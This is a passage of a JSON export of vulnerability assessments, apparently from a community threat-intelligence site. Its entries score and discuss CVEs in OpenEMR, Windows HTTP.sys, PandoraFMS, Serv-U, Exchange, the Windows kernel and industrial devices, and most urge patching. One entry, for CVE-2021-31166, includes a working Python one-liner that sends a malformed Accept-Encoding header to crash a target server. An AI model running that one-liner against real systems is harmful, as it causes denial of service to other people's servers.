          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "4e41cc22-e56e-46a5-8c59-2d6ae7c73c1a",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "cc8965d5-97bc-4618-babb-a087a2406b74",
      "created": "2021-07-08T19:42:14.771017Z",
      "revisionDate": "2021-07-09T18:27:53.88424Z",
      "document": "- Title: OpenEMR < 5.0.2 - (Authenticated) Path Traversal - Local File Disclosure\r\n- Vulnerable version: < 5.0.2 (it means up to 5.0.1.7)\r\n- Patch: https://github.com/openemr/openemr/pull/2592/files\r\n- Docker PoC: https://github.com/sec-it/exploit-CVE-2019-14530/blob/master/docker-compose.yml\r\n\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "abb4463f-a139-48f3-88f6-68bba863df63",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "488abdda-9bc6-4701-bdc0-e87692e75c17",
      "created": "2021-07-08T19:45:21.029607Z",
      "revisionDate": "2021-07-08T21:02:23.371354Z",
      "document": "- Title: OpenEMR < 5.0.1.4 - (Authenticated) File upload - Remote command execution\r\n- Vulnerable version: < 5.0.1.4 (it means up to 5.0.1.3)\r\n- Patch: https://github.com/openemr/openemr/pull/1757/commits/c2808a0493243f618bbbb3459af23c7da3dc5485\r\n- Docker PoC: https://github.com/sec-it/exploit-CVE-2018-15139/blob/master/docker-compose.yml\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "f4b47c78-9243-4b34-b18e-3229d6bba205",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "72cb57ad-d32c-43d3-86b8-f8b617707c5b",
      "created": "2021-07-10T21:26:38.360816Z",
      "revisionDate": "2021-08-14T11:33:36.389986Z",
      "document": "# According to Microsoft's documentation, here are the affected platforms:\r\n\r\nWindows Server, version 2004 (or 20H1) (Server Core installation),\r\nWindows 10 Version 2004 (or 20H1) for ARM64/x64/32-bit Systems,\r\nWindows Server, version 20H2 (Server Core Installation),\r\nWindows 10 Version 20H2 for ARM64/x64/32-bit Systems.\r\n\r\n# CVE-2021-31166\r\n- One Line\r\npython -c \"import requests; print(requests.get('http://192.168.1.101/', headers = {'Accept-Encoding': 'pwn, pwned, tupaci, psevdoIT, krastavichar, *, ,',}))\"\r\n# Proof:\r\nhttps://streamable.com/c258bh\r\n# M0r3\r\nhttps://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-31166\r\nBR",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "8f5f2e53-b4e2-4f30-90a3-e437c4dbd16e",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "6c11f6c0-2d4d-49bd-8fb3-e65745ded070",
      "created": "2021-07-10T21:46:36.517416Z",
      "revisionDate": "2021-07-12T18:51:32.09831Z",
      "document": "# CVE-2021-33041\r\n\r\nIf someone malicious guy sends MD file with malicious content, and for example, the user is a real user ;) and don't know what actually is going on, and open the file with VMD, boom, the game is over for him.\r\n\r\n#Proof:\r\nhttps://streamable.com/j7e13y - low\r\nhttps://streamable.com/oykc86 - medium\r\nhttps://streamable.com/yywb0h - high \r\nhttps://streamable.com/ngx2xm - very high\r\n\r\n# M0r3:\r\nhttps://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-33041\r\n\r\nBR",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "fc9344e2-ad49-4fac-bcd3-223be8dc8746",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "64b1c754-763d-4ef4-95d4-31d3e479c599",
      "created": "2021-07-12T08:57:26.778326Z",
      "revisionDate": "2021-07-24T11:31:10.559993Z",
      "document": "PandoraFMS <=7.54 allows Stored XSS by placing a payload in the name field of a visual console. When a user or an administrator visits the console, the XSS payload will be executed.\r\n\r\n# Reproduce:\r\n- - Stored XSS\r\nhttps://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-35501\r\n# Proof:\r\nhttps://streamable.com/yjr0fm\r\n# PHPSESSID PWNED\r\nhttps://packetstormsecurity.com/files/163466/Pandora-FMS-7.54-Cross-Site-Scripting.html\r\nhttps://streamable.com/b7xt4g",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "e0854aad-f848-4233-9ac5-0654db97ec2e",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "9adf44d2-fa0d-4643-8b97-8b46983b6917",
      "created": "2021-07-12T16:00:13.599143Z",
      "revisionDate": "2021-07-22T16:54:05.075Z",
      "document": "SolarWinds was recently notified by Microsoft of a security vulnerability (RCE) related to Serv-U Managed File Transfer Server and Serv-U Secured FTP and have developed a hotfix to resolve this vulnerability. While Microsoft\u2019s research indicates this vulnerability exploit involves a limited, targeted set of customers and a single threat actor, our joint teams have mobilized to address it quickly.\r\n\r\nThe vulnerability exists in the latest Serv-U version 15.2.3 HF1 released May 5, 2021, and all prior versions. A threat actor who successfully exploits CVE-2021-34527 can run arbitrary code with SYSTEM privileges and install programs; view, change, or delete data, and run programs.  \r\n\r\n\r\n",
      "score": 3,
      "metadata": {},
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        }
      ]
    },
    {
      "id": "e387c29e-e87e-4bb2-b2db-612f2733205f",
      "editorId": "b1e70a5d-7dc1-4371-8754-e2687b8ef59b",
      "topicId": "4a2fd572-63fd-426b-8d34-a9914260ef72",
      "created": "2021-07-13T13:47:01.19915Z",
      "revisionDate": "2021-07-13T13:47:01.204596Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 3,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "fe9dd1f0-6719-4bae-b4ac-a81df1ec0909",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "f285551f-85d9-4674-bab6-921b4a20a97a",
      "created": "2021-07-13T19:53:02.643525Z",
      "revisionDate": "2021-07-13T19:53:02.644276Z",
      "document": "Actors with local access are exploiting this vulnerability to execute code with elevated permission names.\r\nSource: https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-33771",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": []
    },
    {
      "id": "83221f5f-4c80-4a4a-a071-22c04008b8f8",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "32edf036-241c-427f-85cc-0fa70c756f04",
      "created": "2021-07-14T15:59:24.527527Z",
      "revisionDate": "2021-07-14T15:59:24.529524Z",
      "document": "More info on this vulnerability can be found at https://srcincite.io/blog/2021/07/13/fswa-2021-zero-day-give-away.html where the original author, Steven Steely of Source Insight, shows an example of how this vulnerability could be exploited to leak sensitive credentials from configuration files and combined this with a 0day deserialization vulnerability in Apache Shiro in the `rememberMe` cookie to gain RCE. For this reason, given a real world example of how this could be used to gain RCE on a typical deployment, I have elevated the Attacker Value.\r\n\r\nOverall this vulnerability in a nutshell allows unauthenticated users to leak the content of files on the target system provided the target file is within the web root (aka the attacker can't leak the content of files outside of the web root). Provided a user can leak sensitive info (which is not that uncommon), they can utilize this information to then conduct privilege elevation attacks and bypass authentication.",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "cb35fe2f-7d63-496a-92db-937128bf3a1b",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "2f452e56-2cc5-47f9-89c9-92d29ae705e4",
      "created": "2021-07-14T16:22:19.249683Z",
      "revisionDate": "2021-07-14T16:22:19.248001Z",
      "document": "Interesting bug in Modicon M340, M580 and other models from the Modicon series, and has been named by Armis as `ModiPwn`. Bug does require local access to the target's network so you do have to be on the same network as an affected device, however once you do manage to do this, you can leak hashes from the devices memory via undocumented commands (got to love extra hidden features, they are a real treasure trove of bugs). Once this hash has been leaked the attacker can then take over the encrypted connection between one of the Modicon devices and its managing workstation and reconfigure the Modicon device with a passwordless configuration, then allowing the attack to abuse additional undocumented commands to gain RCE and gain full control over the device.\r\n\r\nWhilst there are no reports of in the wild exploitation, the fact that this doesn't yet have a patch is concerning to say the least given that these types of vulnerabilities have been used in the past such as in the Triton malware, its safe to assume that exploits for this vulnerability may start circulating in the wild soon if they haven't already been developed. It is highly recommended to prevent access to these devices until a patch is released, and once one is released, to patch as soon as possible.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "56be8f34-d500-49db-8b17-1abbd0d7df54",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "2043f2fe-6701-4b31-8dbc-31ec2bdbe3b4",
      "created": "2021-07-14T16:28:25.319021Z",
      "revisionDate": "2021-07-14T16:28:25.318699Z",
      "document": "According to https://download.schneider-electric.com/files?p_Doc_Ref=SEVD-2021-194-06 this is a hardcoded password issue in EVlink City / Parking / Smart Wallbox Charging Stations that would grant attackers administrative level control over a EVlink City / Parking / Smart Wallbox Charging Stations web server. These types of devices may not be updated regularly due to the need for them to be running constantly throughout the city, so I can imagine implementing a proper patching strategy will be paramount for ensuring this patch gets applied quickly, as this type of vulnerability could either be used for something simple like just resetting the amount a user has to pay to charge their car, or for gaining further access to city infrastructure, which could be used as a precursor to more targeted attacks.",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "a8934903-071b-4e20-8b50-f9476ee6c3d7",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "25996325-fa5b-4dd4-aced-28622f416d0a",
      "created": "2021-07-14T17:02:16.444678Z",
      "revisionDate": "2021-07-14T17:37:27.246331Z",
      "document": "Looking at Microsoft's advisory at https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34448 shows very little information other than that this is a scripting engine vulnerability which is exploitable across a wide range of Windows OS versions and is exploitable remotely. Further investigation though shows that Cisco Talos at https://blog.talosintelligence.com/2021/07/microsoft-patch-tuesday-for-july-2021.html mentions that this vulnerability is a memory corruption vulnerability triggered when opening a maliciously crafted email or visiting a malicious website. \r\n\r\nFurther examination of https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34448 using the `Download` column (which is not enabled by default but can be added) shows several references to `IE Cumulative Update` which suggests this is potentially an IE related vulnerability. Further examination of past advisories named in the same way like https://msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2017-0224 shows that IE scripting engine vulnerabilities are also referenced using the same style of language, so it would seem this is a memory corruption vulnerability within IE's scripting engine.\r\n\r\nUsers should ideally apply patches to fix this issue given it has been exploited in the wild already, however if this is not possible then users should disable JavaScript in their browsers as most scripting engine vulnerabilities rely on taking advantage of flaws in the JavaScript engine of a given browser, which requires the browser to have JavaScript enabled in the first place. Note that this will break the operation of most sites so patching is preferred where possible.",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "b182f800-df9e-437c-bc5f-efeb23c92eaf",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "bdcf4dde-714e-40c0-b4d9-2b4ecbad31ff",
      "created": "2021-07-14T17:15:24.85186Z",
      "revisionDate": "2021-08-12T21:22:18.028256Z",
      "document": "From https://blog.talosintelligence.com/2021/07/microsoft-patch-tuesday-for-july-2021.html there was a note that this vulnerability seems to have been used in some Exchange Server APT attacks detailed at https://blog.talosintelligence.com/2021/03/hafnium-update.html however it wasn't disclosed that this vulnerability was patched despite being patched back in April 2021. Since this was under active exploitation it is recommended to patch this vulnerability if you haven't applied April 2021's patch updates already.\r\n\r\nSuccessful exploitation will result in RCE on affected Exchange Servers, and requires no prior user privileges, so patch this soon!",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "b376c5b8-ff74-4ca3-811e-a4430f725627",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "f285551f-85d9-4674-bab6-921b4a20a97a",
      "created": "2021-07-14T17:35:29.902746Z",
      "revisionDate": "2021-07-20T21:51:52.466651Z",
      "document": "**Update**: Looks like this was used by the exploit brokerage company Candiru along with CVE-2021-31979 to deliver spyware to targeted users, which according to Microsoft\u2019s blog post, affected at least 100 victims in Palestine, Israel, Iran, Lebanon, Yemen, Spain, United Kingdom, Turkey, Armenia, and Singapore. Victims include human rights defenders, dissidents, journalists, activists, and politicians.\r\n\r\nHmm interesting so this bug only affects Windows 8.1 and later according to https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33771, despite also being disclosed in the same month as CVE-2021-31979, another bug that affected everything from Windows 7 and later onwards. Both bugs however affect the Windows Kernel and are being actively exploited in the wild for LPE.\r\n\r\nThere is little information on what actually is the issue here, although https://twitter.com/mavillon1/status/1415149124064878593/ suggests that `MiFlashDataSecton`, `EtwpUpdatePeriodicCaptureState` and `AlpcpProcessSynchronousRequest` may be possible culprits and reviewing `AlpcpProcessSynchronousRequest` shows that a potential integer overflow was fixed.\r\n\r\nGiven that Microsoft also lists the attack complexity for both vulnerabilities as `Low` it seems likely that other researchers will find a way to replicate these vulnerabilities and create working PoCs for them, particularly given that they have been exploited in the wild. Based on this evidence, it is highly recommended to patch these issues as soon as possible.\r\n\r\nFurther updates will be made to this post if and when these CVEs are tied to specific vulnerable functions.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "6b97b8a2-a2d4-4c2f-94a9-5a78ebe315f4",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "2034ef9d-c938-410e-8db8-9cdeb9c41a7a",
      "created": "2021-07-14T17:35:31.615898Z",
      "revisionDate": "2021-07-20T21:51:24.87501Z",
      "document": "**Update**: Looks like this was used by the exploit brokerage company Candiru along with CVE-2021-33771 to deliver spyware to targeted users, which according to Microsoft's blog post, affected at least 100 victims in Palestine, Israel, Iran, Lebanon, Yemen, Spain, United Kingdom, Turkey, Armenia, and Singapore. Victims include human rights defenders, dissidents, journalists, activists, and politicians.\r\n\r\nHmm, this is a particularly juicy bug as it seems to affect all Windows systems from Windows 7 up to the latest Windows 10. This is in contrast to CVE-2021-33771, which only affects Windows 8.1 and later. Both bugs affect the Windows Kernel and are being actively exploited in the wild for LPE.\r\n\r\nThere is little information on what actually is the issue here, although https://twitter.com/mavillon1/status/1415149124064878593/ suggests that `MiFlashDataSecton`, `EtwpUpdatePeriodicCaptureState` and `AlpcpProcessSynchronousRequest` may be possible culprits and reviewing `AlpcpProcessSynchronousRequest` shows that a potential integer overflow was fixed.\r\n\r\nGiven that Microsoft also lists the attack complexity for both vulnerabilities as `Low` it seems likely that other researchers will find a way to replicate these vulnerabilities and create working PoCs for them, particularly given that they have been exploited in the wild. Based on this evidence, it is highly recommended to patch these issues as soon as possible.\r\n\r\nFurther updates will be made to this post if and when these CVEs are tied to specific vulnerable functions.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "1b4edd90-0255-4e4f-8c10-27c3eef373c2",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "c4cd066b-e590-48f0-96a7-fffafc3d23cc",
      "created": "2021-07-14T19:15:58.878895Z",
      "revisionDate": "2021-07-14T19:16:10.773325Z",
      "document": "This remote code execution (RCE) vulnerability affects Microsoft Exchange Server 2013/ CU23/2016 CU20/2016 CU21/2019 CU10. \r\nAnd according to FireEye exploit code is available.\r\nI will share more information once MSFT releases more details",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "e5a9ffc6-e84e-4003-a761-bc83595dcc27",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "62f348fd-32bc-4c70-b5ad-6389966329c5",
      "created": "2021-07-20T17:25:57.758887Z",
      "revisionDate": "2021-07-28T14:54:39.783838Z",
      "document": "HP and Xerox released security updates for an exploitable kernel drive vulnerability (CVE-2021-3438) that affects the buffer overflow in the SPPORT.SYS driver for over 380 various HP and Samsung printers and approximately a dozen different Xerox printers. Successful exploitation could allow unauthorized actors to gain SYSTEM level permissions and execute code in kernel mode\r\nhttps://labs.sentinelone.com/cve-2021-3438-16-years-in-hiding-millions-of-printers-worldwide-vulnerable/",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": []
    },
    {
      "id": "c0e8a429-b0bf-4bf3-a3a5-ea018524826d",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "6ba1ea9c-84d0-4a70-a858-8d5fcc65962d",
      "created": "2021-07-20T23:38:37.9671Z",
      "revisionDate": "2021-07-26T23:29:07.683823Z",
      "document": "An unprivileged local attacker can exploit this vulnerability by creating, mounting, and deleting a deep directory structure whose total path length exceeds 1GB, and also escalate privileges. \r\n\r\nhttps://www.helpnetsecurity.com/2021/07/20/cve-2021-33909/",
      "score": 4,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": []
    },
    {
      "id": "19c699be-20a7-4e6f-96d1-54bbedd9f06a",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "68c898aa-7786-44eb-aa49-bdce98588d8c",
      "created": "2021-07-21T16:24:50.550712Z",
      "revisionDate": "2021-07-22T16:56:50.498168Z",
